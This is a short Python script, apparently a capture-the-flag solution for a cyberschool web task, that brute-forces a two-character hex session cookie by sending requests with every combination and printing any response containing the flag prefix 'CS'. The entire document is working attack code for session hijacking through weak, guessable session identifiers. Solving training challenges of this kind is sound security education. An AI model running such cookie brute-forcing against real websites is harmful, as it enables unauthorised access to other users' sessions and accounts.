from requests import *
import string
url = "http://cookie.tasks.cyberschool.msu.ru/"
s = Session()
alph = "abcdef0123456789"
for  i in alph:
    for j in alph:
        r = s.get(url,cookies={"session":i+j})
        print(r)
        if "CS" in r.text:
            print(r.text)